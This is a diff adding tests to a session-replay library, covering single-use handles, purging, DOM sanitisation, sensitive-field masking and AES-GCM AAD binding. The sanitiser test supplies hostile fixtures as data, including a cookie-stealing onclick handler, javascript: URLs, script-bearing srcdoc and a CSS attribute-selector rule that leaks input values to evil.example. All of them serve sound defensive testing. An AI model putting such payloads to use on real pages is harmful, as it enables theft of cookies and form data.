@@ -10,9 +10,12 @@ import {
   buildMcpReplaySummary,
   createCrawlReferenceTextOverlay,
   decideReplayEncoding,
+  decryptReplayPayload,
+  encryptReplayPayload,
   evaluateReplayEntitlement,
   maskReplayDomTree,
   runReplayZeroLeakCanaryGate,
+  sanitizeReplayMutationNodes,
   shouldLazyLoadReplayRecorder,
   verifySandboxFrameSafety,
   type ReplaySitePolicy,
@@ -219,6 +222,8 @@ describe('lib/link/replay — Tier-3 Session Replay Entitlement, Masking, Baseli
     const meta = store.putReplay({
       tenantId: 'tenant_a',
       siteId: 'site_a1',
+      pvId: 'pv_store_1',
+      chunkSeq: 0,
       subjectKeyHash: 'subj_hash_001',
       snapshot: masked,
       encoding: 'full_masked_snapshot',
@@ -226,6 +231,8 @@ describe('lib/link/replay — Tier-3 Session Replay Entitlement, Masking, Baseli
       keyVersion: 'tk_v1',
       now,
     });
+    expect(meta.ok).toBe(true);
+    if (!meta.ok) throw new Error('Expected replay to be stored');
     expect(meta.storageBackend).toBe('object_storage_r2');
     expect(meta.usesClickHouseMemory).toBe(false);
     expect(store.countBillableReplaySessions('tenant_a', 'site_a1')).toBe(1);
@@ -258,7 +265,7 @@ describe('lib/link/replay — Tier-3 Session Replay Entitlement, Masking, Baseli
     if (!sel1.ok || !sel2.ok) return;
     expect(sel1.handles[0].handle).not.toBe(sel2.handles[0].handle);
 
-    // Fetch works for own tenant, fails 404 for foreign tenant
+    // Fetch works for own tenant on first redeem, fails 403 on second redeem (single-use!), fails 404 for foreign tenant
     expect(
       store.fetchByHandle({
         handle: sel1.handles[0].handle,
@@ -268,9 +275,22 @@ describe('lib/link/replay — Tier-3 Session Replay Entitlement, Masking, Baseli
         now,
       }).ok
     ).toBe(true);
+    const secondRedeem = store.fetchByHandle({
+      handle: sel1.handles[0].handle,
+      tenantId: 'tenant_a',
+      siteId: 'site_a1',
+      tenantKey32Bytes: key,
+      now,
+    });
+    expect(secondRedeem.ok).toBe(false);
+    if (!secondRedeem.ok) {
+      expect(secondRedeem.httpStatus).toBe(403);
+      expect(secondRedeem.snapshot).toBeNull();
+      expect(secondRedeem.code).toBe('HANDLE_ALREADY_CONSUMED');
+    }
     expect(
       store.fetchByHandle({
-        handle: sel1.handles[0].handle,
+        handle: sel2.handles[0].handle,
         tenantId: 'tenant_b',
         siteId: 'site_a1',
         tenantKey32Bytes: key,
@@ -278,13 +298,13 @@ describe('lib/link/replay — Tier-3 Session Replay Entitlement, Masking, Baseli
       }).ok
     ).toBe(false);
 
-    // 14-day deletion purge physically removes object and invalidates handle
+    // 14-day deletion purge physically removes object and invalidates unredeemed handle sel2
     const purge = store.purgeSubjectReplays('tenant_a', 'subj_hash_001', now);
     expect(purge.purgedReplayIds).toEqual([meta.replayId]);
     expect(purge.residualObjects).toBe(0);
     expect(
       store.fetchByHandle({
-        handle: sel1.handles[0].handle,
+        handle: sel2.handles[0].handle,
         tenantId: 'tenant_a',
         siteId: 'site_a1',
         tenantKey32Bytes: key,
@@ -411,5 +431,215 @@ describe('lib/link/replay — Tier-3 Session Replay Entitlement, Masking, Baseli
     expect(report.allowlistedSafeTextPreserved).toBe(true);
     expect(report.totalLeaks).toBe(0);
     expect(report.passed).toBe(true);
+  });
+
+  test('[H-13] strips <script>/<style>/<noscript>/<template>/<svg><foreignObject>/<iframe>/<object>/<embed> & event attrs inside data-ugk-replay="allow" and MutationObserver insertions, hard-rejects sensitive pages in putReplay, and enforces AES-GCM AAD binding', () => {
+    const allowConfig = {
+      maskConfigVersion: 'mask-allow-v3',
+      approvalId: 'apr_sec_1',
+      allowedKeys: ['allowed_zone'],
+    };
+
+    // 1. Forbidden elements & event/srcdoc/javascript: attrs inside `data-ugk-replay="allow"` are 100% stripped!
+    const snapshot = maskReplayDomTree(
+      {
+        nodeId: 'root',
+        kind: 'element',
+        tagName: 'section',
+        allowlistKey: 'allowed_zone',
+        attributes: {
+          'data-ugk-replay': 'allow',
+          onclick: 'alert(document.cookie)',
+          onmouseover: 'steal()',
+          srcdoc: '<script>evil()</script>',
+          href: 'javascript:evil()',
+        },
+        rect: { x: 0, y: 0, width: 800, height: 600 },
+        children: [
+          {
+            nodeId: 'safe_txt',
+            kind: 'text',
+            tagName: '#text',
+            rect: { x: 0, y: 0, width: 200, height: 24 },
+            textContent: 'Approved Public Heading',
+          },
+          {
+            nodeId: 'evil_script',
+            kind: 'element',
+            tagName: 'script',
+            rect: { x: 0, y: 0, width: 0, height: 0 },
+            textContent: 'const SECRET_INLINE_TOKEN = "LEAK_SCRIPT_1";',
+          },
+          {
+            nodeId: 'evil_style',
+            kind: 'element',
+            tagName: 'style',
+            rect: { x: 0, y: 0, width: 0, height: 0 },
+            textContent: 'input[value^="a"]{background:url(https://evil.example/LEAK_STYLE_2)}',
+          },
+          {
+            nodeId: 'evil_noscript',
+            kind: 'element',
+            tagName: 'noscript',
+            rect: { x: 0, y: 0, width: 0, height: 0 },
+            textContent: 'LEAK_NOSCRIPT_3',
+          },
+          {
+            nodeId: 'evil_template',
+            kind: 'element',
+            tagName: 'template',
+            rect: { x: 0, y: 0, width: 0, height: 0 },
+            textContent: 'LEAK_TEMPLATE_4',
+          },
+          {
+            nodeId: 'svg_wrap',
+            kind: 'element',
+            tagName: 'svg',
+            rect: { x: 0, y: 30, width: 100, height: 100 },
+            children: [
+              {
+                nodeId: 'evil_fo',
+                kind: 'element',
+                tagName: 'foreignObject',
+                rect: { x: 0, y: 0, width: 100, height: 100 },
+                textContent: 'LEAK_FOREIGN_OBJECT_5',
+              },
+            ],
+          },
+          {
+            nodeId: 'evil_iframe',
+            kind: 'element',
+            tagName: 'iframe',
+            attributes: { srcdoc: '<script>LEAK_SRCDOC_6</script>', src: 'javascript:LEAK_JS_7' },
+            rect: { x: 0, y: 140, width: 300, height: 150 },
+            textContent: 'LEAK_IFRAME_TEXT_8',
+          },
+          {
+            nodeId: 'evil_object',
+            kind: 'element',
+            tagName: 'object',
+            attributes: { data: 'https://evil.example/LEAK_OBJECT_9' },
+            rect: { x: 0, y: 300, width: 100, height: 100 },
+          },
+          {
+            nodeId: 'evil_embed',
+            kind: 'element',
+            tagName: 'embed',
+            attributes: { src: 'https://evil.example/LEAK_EMBED_10' },
+            rect: { x: 0, y: 400, width: 100, height: 100 },
+          },
+        ],
+      },
+      allowConfig
+    );
+
+    const serializedSnap = JSON.stringify(snapshot);
+    expect(serializedSnap).toContain('Approved Public Heading');
+    for (const forbidden of [
+      'LEAK_SCRIPT_1',
+      'LEAK_STYLE_2',
+      'LEAK_NOSCRIPT_3',
+      'LEAK_TEMPLATE_4',
+      'LEAK_FOREIGN_OBJECT_5',
+      'LEAK_SRCDOC_6',
+      'LEAK_JS_7',
+      'LEAK_IFRAME_TEXT_8',
+      'LEAK_OBJECT_9',
+      'LEAK_EMBED_10',
+      'onclick',
+      'onmouseover',
+      'srcdoc',
+      'javascript:',
+    ]) {
+      expect(serializedSnap).not.toContain(forbidden);
+    }
+
+    const rendered = buildIsolatedReplayFrame(snapshot);
+    expect(verifySandboxFrameSafety(rendered).safe).toBe(true);
+
+    // 2. Incremental MutationObserver insertions inside an allowlisted parent re-run the exact same sanitizer!
+    const mutBatch = sanitizeReplayMutationNodes(
+      [
+        {
+          nodeId: 'mut_script',
+          kind: 'element',
+          tagName: 'script',
+          rect: { x: 0, y: 0, width: 0, height: 0 },
+          textContent: 'LEAK_MUTATION_SCRIPT',
+        },
+        {
+          nodeId: 'mut_ssn_input',
+          kind: 'input',
+          tagName: 'input',
+          attributes: { name: 'ssn_number', onclick: 'evil()' },
+          inputValue: '123-45-6789',
+          rect: { x: 0, y: 0, width: 200, height: 32 },
+        },
+      ],
+      allowConfig,
+      { parentAllowlisted: true }
+    );
+    expect(mutBatch.nodes).toHaveLength(1); // <script> stripped, input masked
+    expect(mutBatch.nodes[0].textBlock).toBe('[REDACTED_INPUT]');
+    expect(mutBatch.detectedSensitiveFieldOnPage).toBe(true);
+    expect(JSON.stringify(mutBatch)).not.toContain('LEAK_MUTATION_SCRIPT');
+    expect(JSON.stringify(mutBatch)).not.toContain('123-45-6789');
+
+    // 3. putReplay HARD-REJECTS storing any snapshot with detectedSensitiveFieldOnPage === true and zeroes buffer!
+    const store = new ReplayObjectStore();
+    const key = crypto.randomBytes(32);
+    const sensitiveSnap = maskReplayDomTree({
+      nodeId: 'root',
+      kind: 'element',
+      tagName: 'div',
+      rect: { x: 0, y: 0, width: 500, height: 400 },
+      children: [
+        {
+          nodeId: 'health_field',
+          kind: 'input',
+          tagName: 'input',
+          attributes: { name: 'medical_diagnosis' },
+          inputValue: 'secret diagnosis',
+          rect: { x: 0, y: 0, width: 200, height: 30 },
+        },
+      ],
+    });
+    expect(sensitiveSnap.detectedSensitiveFieldOnPage).toBe(true);
+
+    const rawBuf = Buffer.from('SENSITIVE_BUFFER_BYTES_IN_RAM', 'utf8');
+    const rejected = store.putReplay({
+      tenantId: 'tenant_a',
+      siteId: 'site_a1',
+      pvId: 'pv_sens_1',
+      chunkSeq: 0,
+      subjectKeyHash: 'subj_1',
+      snapshot: sensitiveSnap,
+      encoding: 'full_masked_snapshot',
+      tenantKey32Bytes: key,
+      keyVersion: 'v1',
+      rawBufferToZero: rawBuf,
+    });
+    expect(rejected.ok).toBe(false);
+    expect(rejected.status).toBe('blocked_sensitive_page');
+    expect(rawBuf.every((b) => b === 0)).toBe(true);
+    expect(store.countBillableReplaySessions('tenant_a', 'site_a1')).toBe(0);
+
+    // 4. AES-256-GCM AAD prevents cross-tenant, cross-site, cross-PV, or cross-chunkSeq ciphertext transplant!
+    const aadLegit = { tenantId: 'tenant_a', siteId: 'site_a1', pvId: 'pv_100', chunkSeq: 0 };
+    const enc = encryptReplayPayload({ hello: 'world' }, key, 'v1', aadLegit);
+    expect(decryptReplayPayload(enc, key, aadLegit).parsed).toEqual({ hello: 'world' });
+
+    expect(() =>
+      decryptReplayPayload(enc, key, { ...aadLegit, tenantId: 'tenant_b' })
+    ).toThrow();
+    expect(() =>
+      decryptReplayPayload(enc, key, { ...aadLegit, siteId: 'site_other' })
+    ).toThrow();
+    expect(() =>
+      decryptReplayPayload(enc, key, { ...aadLegit, pvId: 'pv_999' })
+    ).toThrow();
+    expect(() =>
+      decryptReplayPayload(enc, key, { ...aadLegit, chunkSeq: 1 })
+    ).toThrow();
   });
 });
